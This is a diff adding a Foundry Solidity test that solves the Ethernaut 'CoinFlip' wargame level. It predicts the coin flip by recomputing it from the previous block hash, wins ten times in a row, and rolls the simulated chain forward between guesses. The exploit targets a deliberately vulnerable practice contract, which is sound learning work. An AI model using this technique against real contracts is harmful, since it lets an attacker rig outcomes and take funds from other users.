@@ -40,7 +40,28 @@ contract TestCoinFlip is BaseTest {
         vm.startPrank(player);
 
         /** CODE YOUR EXPLOIT HERE */
+        // https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f
+        // run with `forge test --match-contract CoinFlip -vv`
+
+        //just use the same calculations as in the contract and roll the chain
+
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        for (uint256 i = 0; i < 10; i++) {
+            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+            uint256 coinFlip = blockValue.div(FACTOR);
+            bool ourGuess = coinFlip == 1 ? true : false;
+
+            level.flip(ourGuess);
+            emit log_named_uint("Consecutive wins", level.consecutiveWins());
+
+            mineBlocks(1);
+        }
 
         vm.stopPrank();
+    }
+
+    function mineBlocks(uint256 numBlocks) internal {
+        uint256 targetBlock = block.number + numBlocks;
+        vm.roll(targetBlock);
     }
 }
